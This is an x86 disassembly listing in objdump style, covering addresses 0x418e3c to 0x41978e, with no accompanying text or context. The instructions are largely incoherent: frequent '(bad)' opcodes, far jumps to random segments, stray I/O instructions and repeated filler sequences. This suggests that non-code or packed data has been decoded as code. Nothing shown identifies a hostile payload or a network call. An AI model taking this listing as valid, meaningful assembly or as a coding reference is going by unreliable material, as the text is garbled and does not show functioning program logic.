  418e3c:	add    bl,BYTE PTR [edx]
  418e3e:	sub    ah,dh
  418e40:	(bad)  
  418e41:	stc    
  418e42:	stc    
  418e43:	jmp    FWORD PTR ss:[ebp-0x31b508e4]
  418e4a:	adc    eax,0x3fcc6bf6
  418e4f:	jmp    0xcc6a:0xd22fc46b
  418e56:	mov    eax,0xf911fd72
  418e5b:	(bad)  
  418e5c:	bound  edi,QWORD PTR [ebp-0x4a8f2c4b]
  418e62:	mov    ah,0xf4
  418e64:	jno    0x418dfc
  418e66:	retf   
  418e67:	jb     0x418e66
  418e69:	sar    cl,0xc3
  418e6c:	jno    0x418dfa
  418e6e:	fdiv   st,st(6)
  418e70:	bound  esi,QWORD PTR [ebp-0x6e941e32]
  418e76:	pushf  
  418e77:	fisubr WORD PTR [edi-0x46]
  418e7a:	jmp    0x418e4f
  418e7c:	ins    DWORD PTR es:[edi],dx
  418e7d:	mov    BYTE PTR [ecx-0x5a81980b],ch
  418e83:	jb     0x418e82
  418e85:	or     al,0x0
	...
  418e97:	add    ah,bh
  418e99:	aam    0x71
  418e9b:	dec    esi
  418e9c:	xchg   ebp,eax
  418e9d:	out    0x70,eax
  418e9f:	pop    edx
  418ea0:	int    0x36
  418ea2:	inc    esi
  418ea3:	inc    eax
  418ea4:	test   ch,dh
  418ea6:	jae    0x418ea8
  418ea8:	arpl   WORD PTR [esi],ax
  418eaa:	sbb    BYTE PTR [edx],al
  418eac:	sbb    al,0x79
  418eae:	bound  ebp,QWORD PTR [esi+0x3]
  418eb1:	jnp    0x418f1f
  418eb3:	arpl   WORD PTR [esi+0x44007079],si
  418eb9:	or     BYTE PTR [eax+0x72],dl
  418ebc:	cld    
  418ebd:	imul   esp,DWORD PTR [edx+0x73],0x4e3239e0
  418ec4:	div    BYTE PTR [eax+0x71]
  418ec7:	add    BYTE PTR [eax+ecx*1+0x67de434c],al
  418ece:	ins    DWORD PTR es:[edi],dx
  418ecf:	push   ebx
  418ed0:	daa    
  418ed1:	js     0x418f39
  418ed3:	outs   dx,BYTE PTR ds:[esi]
  418ed4:	hlt    
  418ed5:	inc    edi
  418ed6:	std    
  418ed7:	(bad)  
  418ed8:	js     0x418ee3
  418eda:	inc    ecx
  418edb:	js     0x418f07
  418edd:	bound  ecx,QWORD PTR [ebp+0x72]
  418ee0:	cmp    al,0x6b
  418ee2:	bound  esi,QWORD PTR [ebx+0x20]
  418ee5:	push   es
  418ee6:	lods   eax,DWORD PTR ds:[esi]
  418ee7:	add    dl,BYTE PTR [eax-0x42aa8e9c]
  418eed:	pop    ebp
  418eee:	pop    esi
  418eef:	outs   dx,BYTE PTR ds:[esi]
  418ef0:	mov    bh,0x69
  418ef2:	bound  esp,QWORD PTR [esi+edx*4+0x6d]
  418ef6:	pusha  
  418ef7:	gs jae 0x418f5b
  418efa:	outs   dx,WORD PTR ds:[esi]
	...
  418f0c:	add    BYTE PTR [eax],al
  418f0e:	jge    0x418f53
  418f10:	data16 ins BYTE PTR es:[edi],dx
  418f12:	outs   dx,DWORD PTR fs:[si]
  418f15:	add    BYTE PTR [eax+0x64],bh
  418f18:	outs   dx,DWORD PTR ds:[esi]
  418f19:	outs   dx,BYTE PTR ds:[esi]
  418f1a:	xchg   BYTE PTR [ecx+0x30],ch
  418f1d:	xor    bh,BYTE PTR [ebp-0x6c9396af]
  418f23:	add    eax,0x77500087
  418f28:	bound  esp,QWORD PTR [ecx+0x37]
  418f2b:	fs push eax
  418f2d:	je     0x418f60
  418f2f:	fs pop esi
  418f31:	ins    DWORD PTR es:[edi],dx
  418f32:	cli    
  418f33:	sub    ch,dl
  418f35:	inc    edi
  418f36:	xor    eax,0xdb61e930
  418f3b:	xlat   BYTE PTR ds:[ebx]
  418f3c:	add    edx,DWORD PTR [ebp+0x73df2afa]
  418f42:	mov    dl,0x22
  418f44:	call   0xe7fe67b5
  418f49:	inc    ebp
  418f4a:	enter  0xe71a,0x50
  418f4e:	(bad)  
  418f4f:	or     eax,0x5bd75edf
  418f54:	add    DWORD PTR [esi],ecx
  418f56:	cli    
  418f57:	push   ds
  418f58:	jmp    0xe342379d
  418f5d:	jae    0x418ef6
  418f5f:	sub    ch,bh
  418f61:	data16 sahf 
  418f63:	pop    ebx
  418f64:	add    DWORD PTR [eax-0x6],esp
  418f67:	push   ds
  418f68:	jmp    0xee902ac0
  418f6d:	dec    edx
  418f6e:	xchg   edi,eax
  418f6f:	inc    eax
  418f70:	mov    edi,0x71
	...
  418f81:	add    BYTE PTR [eax],al
  418f83:	add    BYTE PTR [edi-0x5f2fec0],bl
  418f89:	sahf   
  418f8a:	jmp    0x5773:0xe4416840
  418f91:	mov    ch,0xe7
  418f93:	jo     0x419003
  418f95:	cmp    eax,0x5e5760e7
  418f9a:	add    ecx,esi
  418f9c:	cli    
  418f9d:	mov    dh,0xe5
  418f9f:	bound  eax,QWORD PTR [ebx-0x80]
  418fa2:	in     al,dx
  418fa3:	jae    0x418ff8
  418fa5:	jge    0x418f8c
  418fa7:	inc    ax
  418fa9:	mov    DWORD PTR [ecx],eax
  418fab:	ins    DWORD PTR es:[edi],dx
  418fac:	xor    DWORD PTR es:[esi],0xe589dc32
  418fb3:	imul   edi,edx,0xfffffff8
  418fb6:	add    dh,BYTE PTR [ebp+0x29]
  418fb9:	out    dx,al
  418fba:	repnz data16 and al,0x5
  418fbe:	pop    ebx
  418fbf:	loop   0x418f8d
  418fc1:	add    al,0x54
  418fc3:	cmc    
  418fc4:	sbb    bl,dh
  418fc6:	sbb    DWORD PTR [esi],esi
  418fc8:	int3   
  418fc9:	call   0x70b77808
  418fce:	xchg   edi,eax
  418fcf:	add    ecx,eax
  418fd1:	jmp    0xea17591b
  418fd6:	inc    esp
  418fd7:	int    0xd8
  418fd9:	in     eax,dx
  418fda:	and    edi,esp
  418fdc:	adc    al,0x5
  418fde:	rol    DWORD PTR [ebx],0xa8
  418fe1:	jmp    0xea0a62eb
  418fe6:	sbb    bl,bh
	...
  418ff8:	add    BYTE PTR [eax],al
  418ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ffb:	in     eax,0xfa
  418ffd:	out    dx,al
  418ffe:	cwde   
  418fff:	leave  
  419000:	inc    dl
  419002:	sub    eax,0xc8033670
  419007:	jmp    0xdfd35519
  41900c:	stc    
  41900d:	faddp  st(2),st
  41900f:	jmp    0x68093f3
  419014:	mov    ecx,0xd6bf9ede
  419019:	fimul  WORD PTR [edi+0x34fac3bb]
  41901f:	add    eax,0xea48032b
  419024:	lds    edi,FWORD PTR [esi-0x333c05a9]
  41902a:	pop    eax
  41902b:	out    dx,al
  41902c:	mov    ds:0x610514fb,eax
  419031:	add    ebp,DWORD PTR [eax]
  419033:	jmp    0xef87:0xea4bc485
  41903a:	pop    eax
  41903b:	mov    esp,0x4f4fa83
  419040:	push   cs
  419041:	add    ecx,DWORD PTR [eax-0x16]
  419044:	test   esp,edx
  419046:	sbb    cl,bh
  419048:	call   FWORD PTR [esi-0x7b8d2468]
  41904e:	push   esp
  41904f:	idiv   DWORD PTR [esi]
  419051:	jmp    0x3b40da4f
  419056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419057:	call   0xdaced79e
  41905c:	push   ebp
  41905d:	dec    eax
	...
  41906e:	add    BYTE PTR [eax],al
  419070:	(bad)  
  419072:	bound  ebp,QWORD PTR [eax]
  419074:	idiv   BYTE PTR [esi]
  419076:	call   FWORD PTR [edx]
  419078:	inc    ebp
  419079:	call   0xe17ec9ca
  41907e:	inc    eax
  41907f:	xor    al,0x4c
  419081:	cmc    
  419082:	bound  edx,QWORD PTR [edi]
  419084:	dec    edx
  419085:	shl    BYTE PTR [eax+0x4],cl
  419088:	dec    esp
  419089:	outs   dx,DWORD PTR ds:[esi]
  41908a:	std    
  41908b:	repnz clc 
  41908d:	leave  
  41908e:	bound  edx,QWORD PTR ds:0xfb62f445
  419094:	inc    ebx
  419095:	into   
  419096:	push   0x4
  419098:	cmp    DWORD PTR [edi-0x3],ebp
  41909b:	or     BYTE PTR [edx],bl
  41909d:	stc    
  41909e:	pop    esi
  41909f:	stc    
  4190a0:	and    BYTE PTR [edx+esi*1],dh
  4190a3:	pop    ss
  4190a4:	sbb    bl,bl
  4190a6:	imul   ebp,ecx,0xfffffff9
  4190a9:	push   edi
  4190aa:	add    BYTE PTR [edx-0x42941def],bh
  4190b0:	mov    ah,0xf6
  4190b2:	(bad)  
  4190b3:	retf   0xf2dc
  4190b6:	bound  ebp,QWORD PTR [eax-0x33980c07]
  4190bc:	aad    0xda
  4190be:	xor    bl,bh
  4190c0:	and    ebp,ecx
  4190c2:	imul   edx,DWORD PTR [ebp-0x50000a07],0xffffffd3
  4190c9:	repnz bound ebx,QWORD PTR [ebx-0x558c1c2d]
  4190d0:	scas   eax,DWORD PTR es:[edi]
  4190d1:	iret   
  4190d2:	pusha  
	...
  4190e3:	add    BYTE PTR [eax],al
  4190e5:	add    BYTE PTR [eax+0x526c6f3f],cl
  4190eb:	add    dh,BYTE PTR [edi+0x0]
  4190ee:	pop    edx
  4190ef:	pop    esp
  4190f0:	jno    0x419157
  4190f2:	adc    DWORD PTR [edx+eiz*2+0x74],ebx
  4190f6:	loopne 0x41916a
  4190f8:	bound  esp,QWORD PTR [ecx+0x2f]
  4190fb:	fs push edx
  4190fd:	jb     0x419136
  4190ff:	dec    eax
  419100:	std    
  419101:	dec    esp
  419103:	pop    edi
  419104:	imul   ebp,DWORD PTR [ecx-0x3b],0x63
  419108:	jno    0x419138
  41910a:	mov    edi,0x5600695c
  41910f:	or     DWORD PTR [edi+0x74],ecx
  419112:	adc    DWORD PTR [edx+0x71],edx
  419115:	jb     0x419121
  419117:	dec    eax
  419118:	std    
  419119:	call   DWORD PTR [ebx+0x9]
  41911c:	dec    edi
  41911d:	je     0x419100
  41911f:	push   edx
  419120:	inc    eax
  419121:	push   0x3e4011
  419126:	dec    edi
  419127:	or     DWORD PTR [edi+0x74],ecx
  41912a:	and    DWORD PTR [esi],edi
  41912c:	ins    BYTE PTR es:[edi],dx
  41912d:	dec    ecx
  41912e:	cmc    
  41912f:	je     0x41916f
  419131:	add    BYTE PTR [edi],dh
  419133:	or     DWORD PTR [edi+0x74],ecx
  419136:	xor    DWORD PTR [ebx+0x71],edx
  419139:	jb     0x41918d
  41913b:	add    ch,dl
  41913d:	add    BYTE PTR [eax+0x5e],al
  419140:	outs   dx,DWORD PTR ds:[esi]
  419141:	inc    ebx
  419142:	mov    dh,0x71
  419144:	dec    ebx
  419145:	dec    ecx
  419146:	mov    ds:0x10e01,al
	...
  41915b:	add    BYTE PTR [eax-0x60ac90a3],al
  419161:	jae    0x4191a9
  419163:	push   edi
  419164:	jecxz  0x419167
  419166:	outs   dx,DWORD PTR ds:[esi]
  419167:	push   0x705e5e67
  41916c:	push   0x27
  41916e:	fs ins BYTE PTR es:[edi],dx
  419170:	cli    
  419171:	xchg   DWORD PTR [ecx],eax
  419173:	ss cli 
  419175:	test   bl,ah
  419177:	bound  esp,QWORD PTR [esi]
  419179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41917a:	in     al,0x63
  41917c:	push   ds
  41917d:	jmp    0x73e0:0x7efa2a00
  419184:	and    ch,bh
  419186:	icebp  
  419187:	jae    0x4191a1
  419189:	in     eax,0xe5
  41918b:	pop    esi
  41918c:	pop    ss
  41918d:	leave  
  41918e:	add    eax,DWORD PTR [edi-0x6]
  419191:	retf   0x60e4
  419194:	loope  0x41915e
  419196:	out    dx,eax
  419197:	jmp    FWORD PTR [ebp-0x2]
  41919a:	add    esp,DWORD PTR [ecx-0x2b]
  41919d:	mov    ebp,0x2fd962e5
  4191a2:	add    al,0x26
  4191a4:	cli    
  4191a5:	mov    edx,0xc96ce7
  4191aa:	icebp  
  4191ab:	ins    BYTE PTR es:[edi],dx
  4191ac:	fst    DWORD PTR [edx]
  4191ae:	fbstp  TBYTE PTR [ebx-0x6]
  4191b1:	pop    ds
  4191b2:	add    al,0x71
  4191b4:	lahf   
  4191b5:	ins    DWORD PTR es:[edi],dx
  4191b6:	(bad)  
  4191b8:	sub    eax,0x9f71041a
  4191bd:	(bad)  
  4191be:	fisub  WORD PTR [eax+0x0]
	...
  4191d1:	add    BYTE PTR [esi-0x5c1fea5],ah
  4191d7:	imul   esp,eax,0x15b8460
  4191dd:	inc    ebp
  4191de:	cli    
  4191df:	dec    edx
  4191e0:	loopne 0x419255
  4191e2:	mov    DWORD PTR [esi-0x1e],eax
  4191e5:	push   0xffed4e65
  4191ea:	in     eax,dx
  4191eb:	std    
  4191ec:	add    edx,DWORD PTR [ebp+0x49]
  4191ef:	popf   
  4191f0:	shl    BYTE PTR [ebx+0x5b],cl
  4191f3:	mov    al,0xed
  4191f5:	jb     0x419241
  4191f7:	pop    esi
  4191f8:	add    DWORD PTR [ebp+0x49],esi
  4191fb:	add    eax,0x3852e296
  419200:	fldenv ds:0x382d956
  419206:	inc    ecx
  419207:	add    eax,0xe14ce69b
  41920c:	fwait
  41920d:	repnz sbb bh,dh
  419210:	xchg   esi,eax
  419211:	icebp  
  419212:	push   cs
  419213:	jecxz  0x419294
  419215:	out    0x18,eax
  419217:	(bad)  
  419218:	out    0x3,al
  41921a:	sub    eax,0x11e63c05
  41921f:	fadd   QWORD PTR [edi-0x20]
  419222:	sub    al,bh
  419224:	dec    ebx
  419225:	(bad)
  419229:	(bad)  
  41922b:	fmul   DWORD PTR [ebx+0x4]
  41922e:	jmp    0xd933d62a
  419233:	fidivr DWORD PTR [esi+eiz*1]
	...
  419246:	add    BYTE PTR [eax],al
  419248:	(bad)  
  41924a:	cmp    al,BYTE PTR [edx+edi*8]
  41924d:	add    al,0xe7
  41924f:	add    edi,edx
  419251:	add    al,0xe7
  419253:	add    edi,edx
  419255:	add    al,0xe7
  419257:	add    edi,edx
  419259:	add    al,0xe7
  41925b:	add    edi,edx
  41925d:	add    al,0xe7
  41925f:	add    edi,edx
  419261:	add    al,0xe7
  419263:	add    edi,edx
  419265:	add    al,0xe7
  419267:	add    edi,edx
  419269:	add    al,0xe7
  41926b:	add    edi,edx
  41926d:	add    al,0xe7
  41926f:	add    edi,edx
  419271:	add    al,0xe7
  419273:	add    edi,edx
  419275:	add    al,0xe7
  419277:	add    edi,edx
  419279:	add    al,0xe7
  41927b:	add    edi,edx
  41927d:	add    al,0xe7
  41927f:	add    edi,edx
  419281:	add    al,0xe7
  419283:	add    edi,edx
  419285:	add    al,0x0
  419287:	jmp    0xe9419785
  41928c:	stc    
  41928d:	add    al,0x0
  41928f:	jmp    0xe941978d
  419294:	stc    
  419295:	add    al,0x0
  419297:	jmp    0xe9419795
  41929c:	stc    
  41929d:	add    al,0x0
  41929f:	jmp    0xe941979d
  4192a4:	stc    
  4192a5:	add    al,0x0
  4192a7:	jmp    0xe94197a5
	...
  4192bc:	add    BYTE PTR [eax],al
  4192be:	stc    
  4192bf:	add    al,0x0
  4192c1:	jmp    0xe94197bf
  4192c6:	stc    
  4192c7:	add    al,0x0
  4192c9:	jmp    0xe94197c7
  4192ce:	stc    
  4192cf:	add    al,0x0
  4192d1:	jmp    0xe94197cf
  4192d6:	stc    
  4192d7:	add    al,0x0
  4192d9:	jmp    0xe94197d7
  4192de:	stc    
  4192df:	add    al,0x0
  4192e1:	jmp    0xe94197df
  4192e6:	stc    
  4192e7:	add    al,0x0
  4192e9:	jmp    0xe94197e7
  4192ee:	stc    
  4192ef:	add    al,0x0
  4192f1:	jmp    0xe94197ef
  4192f6:	stc    
  4192f7:	add    al,0x0
  4192f9:	jmp    0xe94197f7
  4192fe:	stc    
  4192ff:	add    al,0x0
  419301:	jmp    0xe94197ff
  419306:	stc    
  419307:	add    al,0x0
  419309:	jmp    0xe9419807
  41930e:	stc    
  41930f:	add    al,0x0
  419311:	add    bl,dl
  419313:	push   es
  419314:	add    BYTE PTR [eax],al
  419316:	rol    DWORD PTR [esi],cl
  419318:	add    BYTE PTR [eax],al
  41931a:	jecxz  0x419322
  41931c:	add    BYTE PTR [eax],al
  41931e:	jecxz  0x419326
	...
  419334:	rol    DWORD PTR [esi],cl
  419336:	add    BYTE PTR [eax],al
  419338:	rol    DWORD PTR [esi],cl
  41933a:	add    BYTE PTR [eax],al
  41933c:	(bad)  
  41933d:	cmp    esp,ecx
  41933f:	int3   
  419340:	mov    esi,0x4fcccc39
  419345:	jle    0x419333
  419347:	push   ecx
  419348:	jno    0x41930a
  41934a:	pop    es
  41934b:	mov    al,BYTE PTR [edx]
  41934d:	jge    0x41939a
  41934f:	inc    DWORD PTR [ecx+0x2fc35b60]
  419355:	jle    0x419343
  419357:	push   ecx
  419358:	and    al,0xd2
  41935a:	xor    cl,cl
  41935c:	fidivr WORD PTR [ebp+0x6f]
  41935f:	xor    BYTE PTR [ecx-0x1374f40d],al
  419365:	or     BYTE PTR [ecx+0x437bf246],cl
  41936b:	cld    
  41936c:	sub    ebx,0x85048b1f
  419372:	cmp    eax,0x8001ce6b
  419377:	aas    
  419378:	mov    cl,0xf0
  41937a:	add    ebx,ebp
  41937c:	and    ecx,edx
  41937e:	pop    ebp
  41937f:	mov    edx,DWORD PTR [edi]
  419381:	enter  0xccc0,0xcf
  419385:	jge    0x419373
  419387:	or     DWORD PTR [esi],0x21
  41938a:	mov    DWORD PTR [ebp+0x2],eax
  41938d:	jl     0x4193d2
  41938f:	loopne 0x419312
  419391:	mov    eax,0x64af8bdf
  419396:	add    DWORD PTR [ecx+0x0],edx
	...
  4193a9:	add    BYTE PTR [esi-0x7e1bac85],bh
  4193af:	mov    edi,0xed428be3
  4193b4:	add    BYTE PTR [ebp-0xe],cl
  4193b7:	jnp    0x419404
  4193b9:	clc    
  4193ba:	jno    0x41938b
  4193bc:	test   DWORD PTR [ebx+0x45012138],0xe8437c02
  4193c6:	jno    0x41937f
  4193c8:	test   DWORD PTR [ebx+0x5501252b],0xf0537c02
  4193d2:	cmp    DWORD PTR [edi+0x9328bf7],0x7bf24d01
  4193dc:	dec    ebx
  4193dd:	cld    
  4193de:	mov    ebp,0xfa00f3bf
  4193e3:	add    al,0x0
  4193e5:	jmp    0x4193da
  4193e7:	jge    0x41943c
  4193e9:	hlt    
  4193ea:	jns    0x419432
  4193ec:	dec    DWORD PTR [eax+0x458970cf]
  4193f2:	jb     0x419471
  4193f4:	dec    ebx
  4193f5:	hlt    
  4193f6:	and    DWORD PTR [ebp+0x7db27317],edi
  4193fc:	push   ebx
  4193fd:	lock add DWORD PTR [esi],0x7c024501
  419404:	inc    ebx
  419405:	(bad)  
  419407:	cli    
  419408:	lods   al,BYTE PTR ds:[si]
  41940a:	clc    
  41940b:	(bad)  
  41940c:	dec    DWORD PTR [edx+0x0]
	...
  41941e:	add    BYTE PTR [eax],al
  419420:	(bad)  
  419421:	dec    eax
  419422:	dec    edi
  419423:	call   0x4197f2
  419428:	jns    0x41946a
  41942a:	or     al,0x85
  41942c:	cmp    ch,bh
  41942e:	sbb    BYTE PTR [ebx+0x458970af],cl
  419434:	and    bh,cl
  419436:	mov    ah,0xc
  419438:	stos   BYTE PTR es:[edi],al
  419439:	jnp    0x419486
  41943b:	in     al,dx
  41943c:	jno    0x41940d
  41943e:	jmp    0x4193cb
  419440:	aas    
  419441:	imul   ecx,DWORD PTR [ecx+0x43048a04],0x88fad108
  41944b:	dec    ebp
  41944c:	jmp    0xefba:0x8304bf84
  419453:	jmp    0x4193eb
  419455:	xor    al,0xc0
  419457:	mov    ebx,edi
  419459:	retf   0xccc0
  41945c:	scas   al,BYTE PTR es:[edi]
  41945d:	cmp    esp,ecx
  41945f:	int3   
  419460:	(bad)  
  419461:	cmp    esp,ecx
  419463:	int3   
  419464:	mov    esi,0x4fcccc39
  419469:	jl     0x419457
  41946b:	or     DWORD PTR [esi-0x6afa17f3],0x68
  419472:	std    
  419473:	mov    DWORD PTR [edi],esi
  419475:	pop    ebp
  419476:	mov    DWORD PTR [ebp-0x6e],eax
  419479:	aad    0xe7
  41947b:	sub    DWORD PTR [ebp+0x68],edi
  41947e:	std    
  41947f:	cmp    DWORD PTR [esi],0x1
  419482:	mov    eax,ds:0xb4
	...
  419493:	add    BYTE PTR [eax],al
  419495:	add    bh,al
  419497:	(bad)  
  41949a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41949b:	add    eax,DWORD PTR [eax+0x0]
  41949e:	jno    0x41945a
  4194a0:	out    0x51,eax
  4194a2:	push   ebp
  4194a3:	adc    dh,BYTE PTR [ebp+edx*2-0x475efb45]
  4194aa:	scas   eax,DWORD PTR es:[edi]
  4194ab:	(bad)  
  4194ae:	cli    
  4194af:	(bad)  
  4194b1:	addr16 inc esi
  4194b3:	add    eax,DWORD PTR [eax+0x0]
  4194b6:	sub    eax,0xbb55b812
  4194bb:	add    al,0x87
  4194bd:	inc    ebp
  4194be:	adc    al,BYTE PTR [eax+0x43]
  4194c1:	cld    
  4194c2:	cli    
  4194c3:	add    al,0x0
  4194c5:	add    BYTE PTR [ecx],ah
  4194c7:	dec    BYTE PTR [eax-0x3d7bf9ab]
  4194cd:	add    DWORD PTR [ebx-0x2e],esi
  4194d0:	sti    
  4194d1:	xor    DWORD PTR [edi+0x69],0x8
  4194d5:	jae    0x4194f2
  4194d7:	jl     0x41951c
  4194d9:	cld    
  4194da:	jno    0x4194d4
  4194dc:	or     BYTE PTR [eax+edi*8-0x7eaf003c],0xd1
  4194e4:	out    0x52,eax
  4194e6:	int    0x11
  4194e8:	mov    ah,0x55
  4194ea:	cmp    eax,DWORD PTR ds:0x7dbe4d89
  4194f0:	add    al,0x8d
  4194f2:	outs   dx,BYTE PTR ds:[esi]
  4194f3:	sar    DWORD PTR [esi],1
  4194f5:	add    BYTE PTR [ecx+0xe58954],ah
	...
  41950b:	add    BYTE PTR [edi+0x44],al
  41950e:	int3   
  41950f:	int3   
  419510:	scas   al,BYTE PTR es:[edi]
  419511:	cmp    ah,cl
  419513:	int3   
  419514:	(bad)  
  419515:	cmp    ah,cl
  419517:	int3   
  419518:	mov    esi,0x2fcccc38
  41951d:	jl     0x41950b
  41951f:	mov    eax,ds:0x3eceea
  419524:	xor    al,0x7c
  419526:	inc    eax
  419527:	xor    BYTE PTR [ecx+0x733e07b9],al
  41952d:	mov    esp,0x38395d07
  419532:	int3   
  419533:	int3   
  419534:	inc    esi
  419535:	cmp    ah,cl
  419537:	int3   
  419538:	ds cmp ah,cl
  41953b:	int3   
  41953c:	scas   eax,DWORD PTR es:[edi]
  41953d:	jnp    0x41952b
  41953f:	mov    esi,DWORD PTR [edi-0x3874b008]
  419545:	cld    
  419546:	dec    esi
  419547:	inc    DWORD PTR [edi]
  419549:	mov    cl,0x53
  41954b:	inc    ecx
  41954c:	cli    
  41954d:	leave  
  41954e:	ror    ah,0x2e
  419551:	cmp    ah,cl
  419553:	int3   
  419554:	inc    esi
  419555:	cmp    ah,cl
  419557:	int3   
  419558:	ds cmp ah,cl
  41955b:	int3   
  41955c:	scas   eax,DWORD PTR es:[edi]
  41955d:	jnp    0x41954b
  41955f:	or     DWORD PTR [esi],0xfffffffc
  419562:	imul   eax,DWORD PTR [eax],0xdc680560
  419568:	clc    
  419569:	(bad)  
  41956a:	(bad)  
  41956b:	dec    BYTE PTR [edi]
  41956d:	lods   eax,DWORD PTR ds:[esi]
  41956e:	push   ebx
  41956f:	inc    ecx
	...
  419580:	add    BYTE PTR [eax],al
  419582:	cli    
  419583:	jnp    0x4195c8
  419585:	clc    
  419586:	bound  ebx,QWORD PTR [ebp+0x2]
  419589:	inc    eax
  41958a:	cli    
  41958b:	jns    0x4195d0
  41958d:	clc    
  41958e:	sub    bl,BYTE PTR [ebp-0x46]
  419591:	(bad)  
  419592:	mov    ebp,0x2c48166
  419597:	jl     0x4195dc
  419599:	cld    
  41959a:	cmp    DWORD PTR [eax-0x2f8eaef1],0xc071520b
  4195a4:	pop    es
  4195a5:	push   eax
  4195a6:	xchg   ebp,eax
  4195a7:	sar    bl,1
  4195a9:	mov    edx,DWORD PTR [edi+0x2fccc0c8]
  4195af:	jp     0x41959d
  4195b1:	push   ecx
  4195b2:	mov    ch,0xc0
  4195b4:	sti    
  4195b5:	add    dl,bh
  4195b7:	add    al,0x0
  4195b9:	jmp    0x4195be
  4195bb:	jp     0x419600
  4195bd:	cld    
  4195be:	jns    0x419605
  4195c0:	dec    DWORD PTR [eax+0x4d8968b7]
  4195c6:	push   esi
  4195c7:	sub    cl,BYTE PTR [ebx+0x10]
  4195ca:	leave  
  4195cb:	add    eax,0x1f25589
  4195d0:	push   ebx
  4195d1:	cld    
  4195d2:	in     eax,dx
  4195d3:	scas   al,BYTE PTR es:[edi]
  4195d4:	add    cl,BYTE PTR [ebx+0x4d00f8c7]
  4195da:	div    BYTE PTR cs:[ebp+0x7442e111]
  4195e1:	pop    es
  4195e2:	bound  eax,QWORD PTR [eax+eax*1]
	...
  4195f5:	add    BYTE PTR [eax],al
  4195f7:	add    dl,bh
  4195f9:	pop    ecx
  4195fa:	add    al,0xeb
  4195fc:	sub    dh,BYTE PTR [edx]
  4195fe:	ror    BYTE PTR [ebx-0x333f37e1],0x2e
  419605:	cmp    esp,ecx
  419607:	int3   
  419608:	(bad)  
  419609:	cmp    ah,cl
  41960b:	int3   
  41960c:	mov    esi,0x4fcccc38
  419611:	jp     0x4195ff
  419613:	mov    ecx,0x502
  419618:	pop    esi
  419619:	jp     0x419622
  41961b:	mov    edi,edi
  41961d:	adc    al,0x56
  41961f:	inc    ecx
  419620:	cli    
  419621:	mov    eax,0xcc38aecc
  419627:	int3   
  419628:	(bad)  
  419629:	cmp    ah,cl
  41962b:	int3   
  41962c:	mov    esi,0x4fcccc38
  419631:	jp     0x41961f
  419633:	or     DWORD PTR [esi+0x2458914],0xffffff82
  41963a:	js     0x419640
  41963c:	cli    
  41963d:	cmc    
  41963e:	or     DWORD PTR [eax-0x74fffb06],0x2f
  419645:	std    
  419646:	mov    BYTE PTR [ecx-0x2],dl
  419649:	sub    edx,0x875a4b08
  41964f:	push   ebp
  419650:	outs   dx,BYTE PTR ds:[esi]
  419651:	jns    0x419696
  419653:	or     BYTE PTR [ecx+0x44],bh
  419656:	or     BYTE PTR [ecx+0x45c574bf],cl
	...
  41966c:	add    BYTE PTR [eax],al
  41966e:	dec    esi
  41966f:	add    al,0x0
  419671:	add    dl,bh
  419673:	pop    ecx
  419674:	pop    es
  419675:	mov    ebp,DWORD PTR [edi-0x43e7e98]
  41967b:	jnp    0x4196c8
  41967d:	cld    
  41967e:	or     edi,0x70cf3bfb
  419684:	jno    0x4196cc
  419686:	jno    0x419647
  419688:	sti    
  419689:	mov    eax,edi
  41968b:	je     0x41969a
  41968d:	mov    bh,0xe6
  41968f:	ret    
  419690:	mov    esi,0xfa81f6fa
  419695:	add    eax,DWORD PTR [edi-0x9ba76ce]
  41969b:	nop
  41969c:	dec    ebx
  41969d:	lock std 
  41969f:	fwait
  4196a0:	adc    al,0x41
  4196a2:	jnp    0x41970b
  4196a4:	std    
  4196a5:	psubd  mm0,QWORD PTR [edi+eax*4]
  4196a9:	push   ebp
  4196aa:	rcl    BYTE PTR [eax-0x2d7ef7bd],cl
  4196b0:	or     eax,DWORD PTR [ebx]
  4196b2:	repnz (bad) 
  4196b4:	push   ebx
  4196b5:	clc    
  4196b6:	jno    0x4196c1
  4196b8:	lsl    edi,WORD PTR [edi]
  4196bb:	cmc    
  4196bc:	mov    BYTE PTR [ebp+0x2],cl
  4196bf:	nop
  4196c0:	push   ebx
  4196c1:	or     al,0xf9
  4196c3:	cmc    
  4196c4:	mov    BYTE PTR [ebp-0x5e],cl
  4196c7:	mov    es,WORD PTR [edx+ecx*1]
  4196ca:	mov    eax,ds:0x25589ae
  4196cf:	nop
  4196d0:	inc    ebx
  4196d1:	or     BYTE PTR [eax],al
	...
  4196e3:	add    cl,bh
  4196e5:	mov    BYTE PTR [ebx],0x89
  4196e8:	aaa    
  4196e9:	or     eax,0x64756be7
  4196ee:	std    
  4196ef:	mov    edx,DWORD PTR [edi-0x3e]
  4196f2:	ror    ah,0xcf
  4196f5:	(bad)  
  4196f6:	in     al,dx
  4196f7:	or     DWORD PTR [esi+0x29],0xffffff89
  4196fb:	inc    ebp
  4196fc:	add    cl,BYTE PTR [esi-0x2d7e1bbd]
  419702:	jecxz  0x41968f
  419704:	scas   eax,DWORD PTR es:[edi]
  419705:	push   0x8dfe5101
  41970a:	push   ebx
  41970b:	call   0x8c296191
  419710:	add    BYTE PTR [ebp-0x72060000],0x4b
  419717:	lock jns 0x4196fc
  41971a:	out    dx,eax
  41971b:	add    BYTE PTR ds:0xfa00f989,al
  419721:	add    al,0x89
  419723:	push   ebp
  419724:	repnz pop es
  419726:	push   ebx
  419727:	lock jae 0x4196e4
  41972a:	fisttp WORD PTR [ebx+0x7881653f]
  419730:	or     al,BYTE PTR ds:0x4df840d
  419736:	add    BYTE PTR [eax],al
  419738:	push   eax
  419739:	add    eax,0xd181006a
  41973e:	fisttp WORD PTR [ebx+0x51010d27]
  419744:	div    BYTE PTR [esi+0x15fc]
	...
  41975a:	cmp    BYTE PTR [ecx-0x367cffc2],0xfb
  419761:	mov    esi,DWORD PTR [edi]
  419763:	cmp    DWORD PTR gs:[eax],0x8b16d8fa
  41976a:	das    
  41976b:	mov    DWORD PTR gs:[ebp+0x2],edx
  41976f:	or     BYTE PTR [edi],cl
  419771:	mov    DWORD PTR [edi],esp
  419773:	jno    0x4196fe
  419775:	inc    ebp
  419776:	call   0xfcc:0xf9084b8f
  41977d:	mov    edi,eax
  41977f:	pop    eax
  419780:	jmp    0xdffb189c
  419785:	mov    edi,DWORD PTR [edi+0xa42010c]
  41978b:	mov    es,WORD PTR [ebx-0xc]
  41978e:	adc    ecx,0xca78bdf
